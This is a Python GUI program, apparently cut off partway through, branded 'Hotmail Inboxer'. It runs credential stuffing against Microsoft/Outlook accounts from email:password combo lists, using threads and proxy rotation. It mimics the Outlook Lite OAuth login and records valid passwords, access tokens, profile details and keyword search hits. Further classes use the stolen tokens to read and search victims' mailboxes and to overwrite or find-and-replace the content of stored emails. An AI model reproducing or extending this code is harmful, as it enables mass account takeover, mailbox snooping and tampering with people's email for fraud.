#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
HOTMAIL INBOXER - ULTIMATE v2.0
- Working Checker with OAuth
- Email Indexer: Browse, search, and list emails from any folder
- Email Body Replacer: Replace/update email body content via Outlook REST API
- Futuristic animated splash screen with cyberpunk aesthetics
- Themes, sounds, AU popups, clickable logs
"""

import requests
import uuid
import json
import re
import threading
import time
import random
import tempfile
import os
import queue
from datetime import datetime, timedelta
from queue import Queue
from user_agent import generate_user_agent
import customtkinter as ctk
from tkinter import filedialog, messagebox, ttk
import pyperclip
import winsound
import sys
import subprocess

# ==================== SOUNDS ====================
SOUND_ENABLED = True

def play_beep(freq, duration):
    if SOUND_ENABLED:
        try:
            winsound.Beep(freq, duration)
        except:
            pass

def play_au_jingle():
    if not SOUND_ENABLED:
        return
    notes = [
        (523, 200), (659, 200), (784, 200), (1047, 200),
        (784, 200), (659, 200), (523, 200), (523, 400),
        (659, 200), (784, 200), (1047, 200), (784, 200),
        (659, 200), (523, 200), (523, 800)
    ]
    for freq, dur in notes:
        play_beep(freq, dur)
        time.sleep(0.05)

def play_country_sound(country):
    sounds = {
        "US": (880, 200), "GB": (784, 200), "CA": (698, 200),
        "DE": (659, 200), "FR": (587, 200), "JP": (523, 200),
        "BR": (494, 200), "IN": (440, 200)
    }
    if country in sounds:
        play_beep(*sounds[country])
    else:
        play_beep(660, 150)

def play_boot_sound():
    """Futuristic boot-up sound sequence"""
    if not SOUND_ENABLED:
        return
    # Ascending cyberpunk arpeggio
    boot_notes = [
        (330, 100), (392, 100), (494, 100), (659, 150),
        (784, 150), (988, 200), (1319, 300)
    ]
    for freq, dur in boot_notes:
        play_beep(freq, dur)
        time.sleep(0.03)

def play_success_chime():
    """Success notification chime"""
    if not SOUND_ENABLED:
        return
    notes = [(784, 150), (988, 150), (1175, 250)]
    for freq, dur in notes:
        play_beep(freq, dur)
        time.sleep(0.05)


# ==================== FUTURISTIC SPLASH SCREEN ====================
class FuturisticSplashScreen:
    """Cyberpunk-themed animated splash screen with particle effects"""

    def __init__(self, on_complete=None):
        self.on_complete = on_complete
        self.window = ctk.CTk()
        self.window.title("HOTMAIL INBOXER v2.0")
        self.window.geometry("900x600")
        self.window.overrideredirect(True)
        self.window.configure(fg_color="#0a0a0f")

        # Center window
        screen_w = self.window.winfo_screenwidth()
        screen_h = self.window.winfo_screenheight()
        x = (screen_w - 900) // 2
        y = (screen_h - 600) // 2
        self.window.geometry(f"900x600+{x}+{y}")
        self.window.attributes('-alpha', 0.0)

        self.frame_index = 0
        self.loading_progress = 0.0
        self.particles = []
        self.scan_lines = []
        self.running = True

        self._build_ui()
        self._start_animations()

        # Fade in
        self._fade_in()

    def _build_ui(self):
        main = ctk.CTkFrame(self.window, fg_color="#0a0a0f", corner_radius=0)
        main.pack(fill="both", expand=True)

        # === TOP SECTION: Decorative hex grid pattern ===
        self.hex_canvas = ctk.CTkCanvas(main, width=900, height=200,
                                         bg="#0a0a0f", highlightthickness=0)
        self.hex_canvas.pack(fill="x")

        # Draw hexagonal grid pattern
        self._draw_hex_grid()

        # === CENTER: Main branding ===
        center_frame = ctk.CTkFrame(main, fg_color="transparent")
        center_frame.pack(expand=True, fill="both", pady=20)

        # Version tag with glow effect
        self.version_label = ctk.CTkLabel(
            center_frame,
            text="◆ ULTIMATE EDITION ◆",
            font=("Courier", 14, "bold"),
            text_color="#ff8c00"
        )
        self.version_label.pack(pady=(20, 5))

        # Main title with futuristic styling
        self.title_label = ctk.CTkLabel(
            center_frame,
            text="HOTMAIL INBOXER",
            font=("Courier", 48, "bold"),
            text_color="#ffffff"
        )
        self.title_label.pack(pady=5)

        # Glitch text effect label
        self.subtitle_label = ctk.CTkLabel(
            center_frame,
            text="",
            font=("Courier", 16),
            text_color="#00d4ff"
        )
        self.subtitle_label.pack(pady=10)

        # Animated status line
        self.status_var = ctk.StringVar(value="Initializing neural interface...")
        self.status_label = ctk.CTkLabel(
            center_frame,
            textvariable=self.status_var,
            font=("Courier", 12),
            text_color="#00ff88"
        )
        self.status_label.pack(pady=20)

        # Decorative divider line
        divider = ctk.CTkCanvas(center_frame, width=600, height=2,
                                bg="#0a0a0f", highlightthickness=0)
        divider.pack(pady=10)
        divider.create_line(0, 1, 600, 1, fill="#ff8c00", width=2)

        # === BOTTOM: Loading section ===
        bottom_frame = ctk.CTkFrame(main, fg_color="transparent")
        bottom_frame.pack(fill="x", padx=80, pady=40)

        # Progress bar container with glow
        progress_container = ctk.CTkFrame(bottom_frame, fg_color="transparent")
        progress_container.pack(fill="x", pady=10)

        # Progress percentage
        self.progress_pct = ctk.CTkLabel(
            progress_container,
            text="0%",
            font=("Courier", 20, "bold"),
            text_color="#ff8c00"
        )
        self.progress_pct.pack(side="right", padx=10)

        # Styled progress bar
        self.progress_bar = ctk.CTkProgressBar(
            progress_container,
            orientation="horizontal",
            width=700,
            height=12,
            corner_radius=6,
            progress_color="#ff8c00",
            fg_color="#2a1a00"
        )
        self.progress_bar.pack(side="left", fill="x", expand=True)
        self.progress_bar.set(0)

        # Loading detail text
        self.detail_var = ctk.StringVar(value="Loading modules...")
        self.detail_label = ctk.CTkLabel(
            bottom_frame,
            textvariable=self.detail_var,
            font=("Courier", 10),
            text_color="#666666"
        )
        self.detail_label.pack(pady=5)

        # Scrolling data stream effect at bottom
        self.data_stream = ctk.CTkLabel(
            main,
            text="",
            font=("Courier", 9),
            text_color="#1a3a1a"
        )
        self.data_stream.pack(side="bottom", pady=5)

    def _draw_hex_grid(self):
        """Draw decorative hexagonal pattern on canvas"""
        w, h = 900, 200
        hex_size = 25
        for row in range(8):
            for col in range(25):
                x = col * (hex_size * 1.8) + (row % 2) * (hex_size * 0.9)
                y = row * (hex_size * 1.5) + 10
                if x < w and y < h:
                    opacity = random.choice(["#1a0a00", "#2a1500", "#0f0a00", "#1a1a00"])
                    self._draw_hex(x, y, hex_size * 0.7, opacity)

    def _draw_hex(self, x, y, size, color):
        """Draw a single hexagon"""
        points = []
        for i in range(6):
            angle = (i * 60 - 30) * 3.14159 / 180
            px = x + size * 0.8 * (i % 2)
            py = y + size * 0.5 * (i // 3)
            points.extend([px, py])
        # Simplified hex drawing
        self.hex_canvas.create_rectangle(x-8, y-6, x+8, y+6,
                                          fill=color, outline="", width=0)

    def _fade_in(self):
        """Fade in the splash screen"""
        alpha = 0.0
        def fade():
            nonlocal alpha
            alpha += 0.05
            if alpha >= 1.0:
                self.window.attributes('-alpha', 1.0)
                play_boot_sound()
                return
            self.window.attributes('-alpha', alpha)
            self.window.after(30, fade)
        fade()

    def _fade_out(self):
        """Fade out and close splash screen"""
        alpha = 1.0
        def fade():
            nonlocal alpha
            alpha -= 0.08
            if alpha <= 0:
                self.window.destroy()
                if self.on_complete:
                    self.on_complete()
                return
            self.window.attributes('-alpha', alpha)
            self.window.after(30, fade)
        fade()

    def _start_animations(self):
        """Start all animation loops"""
        self._animate_glitch_text()
        self._animate_loading()
        self._animate_data_stream()
        self._pulse_version()

    def _animate_glitch_text(self):
        """Glitch text animation for subtitle"""
        if not self.running:
            return
        glitches = [
            "Email Intelligence Platform",
            "Em4il Int3llig3nc3 Pl4tf0rm",
            "Ema#l Intelligence Pla$orm",
            "Email Inte!!igence P!atform",
            "Email Intelligence Platform",
            "Ema1l 1nt3ll1g3nc3 Pl4tf0rm",
            "◆ Email Intelligence ◆",
            "◆ Ema!l !ntell!gence ◆",
            "◆ Email Intelligence ◆",
        ]
        text = glitches[self.frame_index % len(glitches)]
        self.subtitle_label.configure(text=text)
        self.frame_index += 1
        self.window.after(120, self._animate_glitch_text)

    def _pulse_version(self):
        """Pulsing glow effect on version label"""
        if not self.running:
            return
        colors = ["#ff8c00", "#ffaa33", "#ffcc66", "#ff8c00", "#cc6600", "#ff8c00"]
        color = colors[self.frame_index % len(colors)]
        self.version_label.configure(text_color=color)
        self.window.after(200, self._pulse_version)

    def _animate_loading(self):
        """Simulate loading progress"""
        if not self.running:
            return

        loading_stages = [
            (0.05, "Initializing neural interface...", "Loading core modules..."),
            (0.10, "Loading authentication engine...", "Importing OAuth2 protocols..."),
            (0.15, "Mounting Outlook REST API...", "Configuring API endpoints..."),
            (0.20, "Loading Email Indexer...", "Building search index..."),
            (0.30, "Loading Body Replacer...", "Setting up message editors..."),
            (0.40, "Compiling regex patterns...", "Pattern matching ready..."),
            (0.50, "Initializing thread pool...", "Worker threads spawned..."),
            (0.60, "Loading proxy support...", "Proxy chains configured..."),
            (0.70, "Loading sound engine...", "Audio subsystems online..."),
            (0.80, "Loading theme engine...", "Dark mode initialized..."),
            (0.90, "Verifying integrity...", "All systems nominal..."),
            (0.95, "Launch sequence initiated...", "Ready for operation..."),
            (1.00, "SYSTEM READY", "Access granted.")
        ]

        self.loading_progress += random.uniform(0.008, 0.025)
        if self.loading_progress > 1.0:
            self.loading_progress = 1.0

        # Find current stage
        for threshold, status, detail in loading_stages:
            if self.loading_progress <= threshold:
                self.status_var.set(f">_ {status}")
                self.detail_var.set(detail)
                break

        self.progress_bar.set(self.loading_progress)
        self.progress_pct.configure(text=f"{int(self.loading_progress * 100)}%")

        if self.loading_progress >= 1.0:
            # Loading complete - fade out after brief pause
            self.window.after(800, self._fade_out)
            return

        self.window.after(80, self._animate_loading)

    def _animate_data_stream(self):
        """Simulate scrolling binary/data stream at bottom"""
        if not self.running:
            return
        chars = "01ABCDEF"
        stream = "".join(random.choice(chars) for _ in range(80))
        self.data_stream.configure(text=stream)
        self.window.after(100, self._animate_data_stream)

    def show(self):
        """Start the splash screen main loop"""
        self.window.mainloop()


# ==================== EMAIL INDEXER ====================
class EmailIndexer:
    """Index, list, and search emails from Outlook folders via REST API"""

    def __init__(self):
        self.session = requests.Session()

    def get_headers(self, access_token, cid):
        return {
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Content-Type": "application/json"
        }

    def get_user_folders(self, access_token, cid):
        """Fetch all mail folders using Outlook REST API"""
        headers = self.get_headers(access_token, cid)
        url = "https://outlook.office.com/api/v2.0/me/mailfolders"
        folders = []
        try:
            while url:
                resp = self.session.get(url, headers=headers, timeout=30)
                if resp.status_code != 200:
                    break
                data = resp.json()
                for f in data.get('value', []):
                    folders.append({
                        'id': f.get('Id') or f.get('id'),
                        'name': f.get('DisplayName') or f.get('displayName', 'Unknown'),
                        'wellKnownName': f.get('WellKnownName', '') or f.get('wellKnownName', ''),
                        'total_count': f.get('TotalItemCount', 0),
                        'unread_count': f.get('UnreadItemCount', 0)
                    })
                url = data.get('@odata.nextLink')
        except Exception as e:
            print(f"[ERROR] Folder fetch: {str(e)}")
        return folders

    def get_messages(self, access_token, cid, folder_id, search_query="", page_size=50, skip=0):
        """Get messages from a folder with optional search"""
        headers = self.get_headers(access_token, cid)
        base_url = f"https://outlook.office.com/api/v2.0/me/mailfolders/{folder_id}/messages"
        params = f"$top={page_size}&$skip={skip}&$select=Id,Subject,From,ReceivedDateTime,HasAttachments,BodyPreview,IsRead,Importance,ConversationId"
        if search_query:
            params += f"&$search=\"{search_query}\""
        params += "&$orderby=ReceivedDateTime desc"
        url = f"{base_url}?{params}"

        try:
            resp = self.session.get(url, headers=headers, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                messages = []
                for m in data.get('value', []):
                    from_addr = m.get('From', {})
                    if from_addr:
                        from_email = from_addr.get('EmailAddress', {}).get('Address', 'Unknown')
                        from_name = from_addr.get('EmailAddress', {}).get('Name', '')
                    else:
                        from_email = 'Unknown'
                        from_name = ''

                    messages.append({
                        'id': m.get('Id', ''),
                        'subject': m.get('Subject', '(no subject)'),
                        'from_email': from_email,
                        'from_name': from_name,
                        'received': m.get('ReceivedDateTime', ''),
                        'has_attachments': m.get('HasAttachments', False),
                        'preview': m.get('BodyPreview', '')[:150],
                        'is_read': m.get('IsRead', True),
                        'importance': m.get('Importance', 'normal'),
                        'conversation_id': m.get('ConversationId', '')
                    })
                return messages, data.get('@odata.nextLink')
            else:
                return [], None
        except Exception as e:
            print(f"[ERROR] Message fetch: {str(e)}")
            return [], None

    def get_message_body(self, access_token, cid, message_id):
        """Get full message body including HTML content"""
        headers = self.get_headers(access_token, cid)
        url = f"https://outlook.office.com/api/v2.0/me/messages/{message_id}?$select=Body,Subject,From,ToRecipients"
        try:
            resp = self.session.get(url, headers=headers, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                return {
                    'subject': data.get('Subject', ''),
                    'body_type': data.get('Body', {}).get('ContentType', 'Text'),
                    'body_content': data.get('Body', {}).get('Content', ''),
                    'from': data.get('From', {}),
                    'to': data.get('ToRecipients', [])
                }
        except Exception as e:
            print(f"[ERROR] Body fetch: {str(e)}")
        return None

    def search_messages(self, access_token, cid, query, folder_id=None, max_results=50):
        """Search messages across folders"""
        headers = self.get_headers(access_token, cid)
        if folder_id:
            url = f"https://outlook.office.com/api/v2.0/me/mailfolders/{folder_id}/messages?$search=\"{query}\"&$top={max_results}&$orderby=ReceivedDateTime desc"
        else:
            url = f"https://outlook.office.com/api/v2.0/me/messages?$search=\"{query}\"&$top={max_results}&$orderby=ReceivedDateTime desc"

        try:
            resp = self.session.get(url, headers=headers, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                messages = []
                for m in data.get('value', []):
                    messages.append({
                        'id': m.get('Id', ''),
                        'subject': m.get('Subject', '(no subject)'),
                        'from_email': m.get('From', {}).get('EmailAddress', {}).get('Address', 'Unknown'),
                        'from_name': m.get('From', {}).get('EmailAddress', {}).get('Name', ''),
                        'received': m.get('ReceivedDateTime', ''),
                        'has_attachments': m.get('HasAttachments', False),
                        'preview': m.get('BodyPreview', '')[:200],
                        'is_read': m.get('IsRead', True),
                        'folder_id': folder_id or 'all'
                    })
                return messages
        except Exception as e:
            print(f"[ERROR] Search: {str(e)}")
        return []


# ==================== EMAIL BODY REPLACER ====================
class EmailBodyReplacer:
    """Replace/update email body content via Outlook REST API"""

    def __init__(self):
        self.session = requests.Session()

    def get_headers(self, access_token, cid):
        return {
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Content-Type": "application/json"
        }

    def get_message_body(self, access_token, cid, message_id):
        """Get current message body for editing"""
        headers = self.get_headers(access_token, cid)
        url = f"https://outlook.office.com/api/v2.0/me/messages/{message_id}?$select=Body,Subject,From,ToRecipients,ReceivedDateTime"
        try:
            resp = self.session.get(url, headers=headers, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                return {
                    'subject': data.get('Subject', ''),
                    'body_type': data.get('Body', {}).get('ContentType', 'HTML'),
                    'body_content': data.get('Body', {}).get('Content', ''),
                    'from': data.get('From', {}),
                    'to': data.get('ToRecipients', []),
                    'received': data.get('ReceivedDateTime', '')
                }
        except Exception as e:
            print(f"[ERROR] Get body: {str(e)}")
        return None

    def replace_body(self, access_token, cid, message_id, new_body, body_type="HTML"):
        """Replace the entire body of an email"""
        headers = self.get_headers(access_token, cid)
        url = f"https://outlook.office.com/api/v2.0/me/messages/{message_id}"
        payload = {
            "Body": {
                "ContentType": body_type,
                "Content": new_body
            }
        }
        try:
            resp = self.session.patch(url, json=payload, headers=headers, timeout=30)
            if resp.status_code in [200, 201, 204]:
                return True, "Body updated successfully"
            else:
                error_text = resp.text[:500] if resp.text else f"HTTP {resp.status_code}"
                return False, f"Failed: {error_text}"
        except Exception as e:
            return False, f"Error: {str(e)}"

    def append_to_body(self, access_token, cid, message_id, text_to_append, body_type="HTML"):
        """Append text to existing email body"""
        current = self.get_message_body(access_token, cid, message_id)
        if not current:
            return False, "Could not retrieve current body"

        existing_body = current['body_content']
        if body_type == "HTML":
            new_body = existing_body + f"<br><br><div style='color:#666;border-top:1px solid #ccc;padding-top:10px;'>{text_to_append}</div>"
        else:
            new_body = existing_body + f"\n\n---\n{text_to_append}"

        return self.replace_body(access_token, cid, message_id, new_body, body_type)

    def prepend_to_body(self, access_token, cid, message_id, text_to_prepend, body_type="HTML"):
        """Prepend text to existing email body"""
        current = self.get_message_body(access_token, cid, message_id)
        if not current:
            return False, "Could not retrieve current body"

        existing_body = current['body_content']
        if body_type == "HTML":
            new_body = f"<div style='color:#0066cc;background:#e6f2ff;padding:8px;margin-bottom:10px;'>{text_to_prepend}</div>" + existing_body
        else:
            new_body = f"{text_to_prepend}\n\n---\n\n" + existing_body

        return self.replace_body(access_token, cid, message_id, new_body, body_type)

    def find_and_replace_in_body(self, access_token, cid, message_id, find_text, replace_text, body_type="HTML"):
        """Find and replace text within email body"""
        current = self.get_message_body(access_token, cid, message_id)
        if not current:
            return False, "Could not retrieve current body"

        existing_body = current['body_content']
        if find_text in existing_body:
            new_body = existing_body.replace(find_text, replace_text)
            return self.replace_body(access_token, cid, message_id, new_body, body_type)
        else:
            return False, f"Text '{find_text}' not found in body"


# ==================== CHECKER ENGINE (ORIGINAL WORKING VERSION) ====================
class HotmailChecker:
    def __init__(self, on_log, on_hit, on_stats_update, on_progress, on_finished):
        self.on_log = on_log
        self.on_hit = on_hit
        self.on_stats_update = on_stats_update
        self.on_progress = on_progress
        self.on_finished = on_finished
        self.stop_flag = False

    def stop(self):
        self.stop_flag = True

    def format_proxy(self, proxy):
        if '@' in proxy:
            userpass, ipport = proxy.split('@')
            user, pwd = userpass.split(':')
            ip, port = ipport.split(':')
            return {"http": f"http://{user}:{pwd}@{ip}:{port}",
                    "https": f"http://{user}:{pwd}@{ip}:{port}"}
        else:
            ip, port = proxy.split(':')
            return {"http": f"http://{ip}:{port}",
                    "https": f"http://{ip}:{port}"}

    def get_mailbox_settings(self, access_token, cid):
        try:
            headers = {
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "User-Agent": "Outlook-Android/2.0"
            }
            resp = requests.get(
                "https://outlook.office.com/api/v2.0/me/mailboxsettings",
                headers=headers, timeout=15
            )
            if resp.status_code == 200:
                data = resp.json()
                return data.get("Language", "en"), data.get("TimeZone", "UTC")
        except:
            pass
        return "en", "UTC"

    def check_combo(self, email, password, proxy_list, keyword):
        retries = 0
        while retries < 3 and not self.stop_flag:
            proxy = None
            proxies = None
            if proxy_list:
                proxy = random.choice(proxy_list)
                proxies = self.format_proxy(proxy)

            session = requests.Session()
            if proxies:
                session.proxies = proxies

            try:
                ua = generate_user_agent()
                url = ("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
                       "client_info=1&haschrome=1&login_hint=" + email +
                       "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                       "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                       "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D")
                headers = {"User-Agent": ua, "Accept": "text/html,application/xhtml+xml",
                           "X-Requested-With": "com.microsoft.outlooklite",
                           "client-request-id": str(uuid.uuid4()),
                           "correlation-id": str(uuid.uuid4())}
                resp = session.get(url, headers=headers, allow_redirects=True, timeout=30)
                text = resp.text

                PPFT = ""
                urlPost = ""
                match = re.search(r'var ServerData = ({.*?});', text, re.DOTALL)
                if match:
                    try:
                        sd = json.loads(match.group(1))
                        sFTTag = sd.get('sFTTag', '')
                        if sFTTag:
                            ppft_match = re.search(r'value="([^"]+)"', sFTTag)
                            if ppft_match:
                                PPFT = ppft_match.group(1)
                        urlPost = sd.get('urlPost', '')
                    except:
                        pass
                if not PPFT:
                    start = text.find('name="PPFT" value="')
                    if start != -1:
                        start += len('name="PPFT" value="')
                        end = text.find('"', start)
                        PPFT = text[start:end] if end != -1 else ""
                if not urlPost:
                    match = re.search(r'"urlPost":"([^"]+)"', text)
                    if match:
                        urlPost = match.group(1)

                if not PPFT or not urlPost:
                    return False, None

                cookies = session.cookies.get_dict()
                MSPRequ = cookies.get('MSPRequ', '')
                uaid = cookies.get('uaid', '')
                MSPOK = cookies.get('MSPOK', '')
                OParams = cookies.get('OParams', '')
                referer = resp.url

                data = (f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&"
                        f"lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}"
                        f"&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid="
                        f"&PPFT={PPFT}&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0"
                        f"&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772")
                post_headers = {"User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded",
                                "Origin": "https://login.live.com", "Referer": referer,
                                "Cookie": f"MSPRequ={MSPRequ}; uaid={uaid}; MSPOK={MSPOK}; OParams={OParams}"}
                post_resp = session.post(urlPost, data=data, headers=post_headers, allow_redirects=False, timeout=30)

                if "__Host-MSAAUTHP" not in session.cookies.get_dict():
                    return False, None

                auth_code = ""
                if post_resp.status_code in [301,302,303,307,308]:
                    loc = post_resp.headers.get('Location', '')
                    if 'msauth://' in loc and 'code=' in loc:
                        auth_code = loc.split('code=')[1].split('&')[0]
                else:
                    m = re.search(r'window\.location\s*=\s*["\']([^"\']+)["\']', post_resp.text)
                    if m and 'msauth://' in m.group(1) and 'code=' in m.group(1):
                        auth_code = m.group(1).split('code=')[1].split('&')[0]

                CID = session.cookies.get('MSPCID', '').upper()
                if not auth_code:
                    return False, None

                token_data = {"client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                              "grant_type": "authorization_code", "code": auth_code,
                              "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                              "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
                token_resp = requests.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                                           data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"},
                                           timeout=30)
                if token_resp.status_code != 200:
                    return False, None
                token_json = token_resp.json()
                access_token = token_json.get("access_token", "")
                if not access_token:
                    return False, None

                profile_headers = {"User-Agent": "Outlook-Android/2.0",
                                   "Authorization": f"Bearer {access_token}",
                                   "X-AnchorMailbox": f"CID:{CID}"}
                profile_resp = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                                            headers=profile_headers, timeout=30)
                Name, Country, Birthdate = "", "", "N/A"
                if profile_resp.status_code == 200:
                    prof = profile_resp.json()
                    if "accounts" in prof and prof["accounts"]:
                        acc = prof["accounts"][0]
                        Country = acc.get("location", "")
                        BD = acc.get("birthDay", "")
                        BM = acc.get("birthMonth", "")
                        BY = acc.get("birthYear", "")
                        if BD and BM and BY:
                            Birthdate = f"{BY}-{str(BM).zfill(2)}-{str(BD).zfill(2)}"
                    if "names" in prof and prof["names"]:
                        Name = prof["names"][0].get("displayName", "")

                mailbox_lang, mailbox_tz = self.get_mailbox_settings(access_token, CID)

                Total = "0"
                if keyword:
                    search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
                    payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
                               "TimeZone": "UTC", "TextDecorations": "Off",
                               "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
                                                   "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                                                   "From": 0, "Query": {"QueryString": keyword}, "Size": 25,
                                                   "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]}
                    search_headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": f"Bearer {access_token}",
                                      "X-AnchorMailbox": f"CID:{CID}", "Content-Type": "application/json"}
                    search_resp = requests.post(search_url, json=payload, headers=search_headers, timeout=30)
                    if search_resp.status_code == 200:
                        m = re.search(r'"Total":(\d+)', search_resp.text)
                        if m:
                            Total = m.group(1)

                info = {
                    "email": email, "password": password, "name": Name,
                    "country": Country, "birthdate": Birthdate,
                    "mailbox_lang": mailbox_lang, "mailbox_tz": mailbox_tz,
                    "total": Total, "has_keyword": keyword and Total != "0",
                    "access_token": access_token,
                    "user_id": CID,
                    "checkbox_state": False
                }
                return True, info

            except Exception as e:
                retries += 1
                time.sleep(0.1)
        return False, None

    def run(self, combos, proxy_list, keyword, threads):
        q = Queue()
        for c in combos:
            q.put(c)

        total = len(combos)
        processed = 0
        stats = {"hits": 0, "custom": 0, "bad": 0}
        lock = threading.Lock()

        def worker():
            nonlocal processed
            while not self.stop_flag:
                try:
                    combo = q.get(timeout=1)
                except:
                    break
                if '@' not in combo or ':' not in combo:
                    q.task_done()
                    continue
                email, pwd = combo.split(':', 1)
                success, info = self.check_combo(email, pwd, proxy_list, keyword)
                with lock:
                    processed += 1
                    if success:
                        if info["has_keyword"]:
                            stats["hits"] += 1
                            self.on_hit(info, hit_type="keyword")
                        else:
                            stats["custom"] += 1
                            self.on_hit(info, hit_type="custom")
                    else:
                        stats["bad"] += 1
                        self.on_log(f"[BAD] {email}:{pwd}", "bad")
                    self.on_stats_update(stats)
                    self.on_progress(processed, total)
                q.task_done()

        worker_threads = []
        for _ in range(min(threads, total)):
            t = threading.Thread(target=worker)
            t.daemon = True
            worker_threads.append(t)
            t.start()

        for t in worker_threads:
            t.join()

        self.on_finished(stats)


# ==================== GUI APPLICATION (COMPLETE v2.0) ====================
class HotmailUltimateGUI:
    def __init__(self):
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("dark-blue")
        self.root = ctk.CTk()
        self.root.title("HOTMAIL INBOXER - ULTIMATE v2.0 (Email Indexer + Body Replacer)")
        self.root.geometry("1400x1000")
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

        # Variables
        self.input_file = ""
        self.temp_file = None
        self.output_dir = os.getcwd()
        self.keyword = ""
        self.threads = 10
        self.proxy_list = []
        self.use_proxies = False
        self.checker = None
        self.running = False
        self.muted = False
        self.popup_countries = {"AU"}
        self.current_theme = "Dark Orange"

        # Email Indexer & Body Replacer
        self.indexer = EmailIndexer()
        self.body_replacer = EmailBodyReplacer()
        self.selected_hits_for_tools = []

        # Indexer state
        self.current_account_for_indexer = None
        self.current_folders = []
        self.current_messages = []
        self.current_folder_id = None
        self.current_page = 0

        # Body replacer state
        self.current_account_for_replacer = None
        self.current_message_for_edit = None
        self.edited_body_content = ""

        # Themes definition
        self.themes = {
            "Dark Orange": {"bg": "#1a1a1a", "fg": "#ff8c00", "button": "#ff8c00", "progress": "#ff8c00", "text": "#ffffff"},
            "Matrix Green": {"bg": "#0a0f0a", "fg": "#00ff41", "button": "#00ff41", "progress": "#00ff41", "text": "#b0ffb0"},
            "Cyberpunk Pink": {"bg": "#1a001a", "fg": "#ff00ff", "button": "#ff00ff", "progress": "#ff00ff", "text": "#ffffff"},
            "Midnight Blue": {"bg": "#0a0a2a", "fg": "#3a6ea5", "button": "#3a6ea5", "progress": "#3a6ea5", "text": "#e0e0ff"},
            "Light Hacker": {"bg": "#f0f0f0", "fg": "#d45a00", "button": "#d45a00", "progress": "#d45a00", "text": "#000000"}
        }

        self.results_data = []
        self.table = None

        self.build_gui()
        self.poll_queues()

    def build_gui(self):
        self.notebook = ctk.CTkTabview(self.root)
        self.notebook.pack(fill="both", expand=True, padx=10, pady=10)

        self.checker_tab = self.notebook.add("Checker")
        self.build_checker_tab()

        self.indexer_tab = self.notebook.add("Email Indexer")
        self.build_indexer_tab()

        self.replacer_tab = self.notebook.add("Body Replacer")
        self.build_replacer_tab()

    # ==================== CHECKER TAB (ORIGINAL, MODIFIED) ====================
    def build_checker_tab(self):
        main_frame = self.checker_tab

        # Top toolbar
        toolbar = ctk.CTkFrame(main_frame, height=50)
        toolbar.pack(fill="x", pady=(0,10))
        ctk.CTkLabel(toolbar, text="THEME:", font=("Consolas",12)).pack(side="left", padx=5)
        self.theme_var = ctk.StringVar(value="Dark Orange")
        theme_menu = ctk.CTkOptionMenu(toolbar, values=list(self.themes.keys()),
                                       variable=self.theme_var, command=self.change_theme)
        theme_menu.pack(side="left", padx=5)

        self.mute_btn = ctk.CTkButton(toolbar, text="MUTE", command=self.toggle_mute, width=100)
        self.mute_btn.pack(side="left", padx=20)

        ctk.CTkLabel(toolbar, text="POPUP COUNTRIES:", font=("Consolas",12)).pack(side="left", padx=5)
        self.country_selector = ctk.CTkOptionMenu(toolbar,
                                                  values=["AU","US","GB","CA","DE","FR","JP","BR","IN","ALL"],
                                                  command=self.set_popup_countries)
        self.country_selector.pack(side="left", padx=5)

        self.quote_var = ctk.StringVar(value=">_ HACK THE PLANET")
        quote_label = ctk.CTkLabel(toolbar, textvariable=self.quote_var, font=("Courier",12,"bold"),
                                   text_color="cyan")
        quote_label.pack(side="right", padx=20)
        self.animate_quotes()

        self.cmd_var = ctk.StringVar(value="$ nmap -sV -p- target.com")
        cmd_label = ctk.CTkLabel(toolbar, textvariable=self.cmd_var, font=("Courier",10),
                                 text_color="lime")
        cmd_label.pack(side="right", padx=10)
        self.animate_commands()

        # Input section
        input_frame = ctk.CTkFrame(main_frame)
        input_frame.pack(fill="x", pady=5)

        self.input_type = ctk.StringVar(value="file")
        ctk.CTkRadioButton(input_frame, text="Load from file", variable=self.input_type,
                           value="file", command=self.toggle_input_mode).grid(row=0,column=0,padx=5)
        ctk.CTkRadioButton(input_frame, text="Paste combos (temp file)", variable=self.input_type,
                           value="paste", command=self.toggle_input_mode).grid(row=0,column=1,padx=5)

        self.file_frame = ctk.CTkFrame(input_frame)
        self.file_frame.grid(row=1,column=0,columnspan=3,sticky="ew",pady=5)
        self.file_entry = ctk.CTkEntry(self.file_frame, width=400)
        self.file_entry.pack(side="left", padx=5)
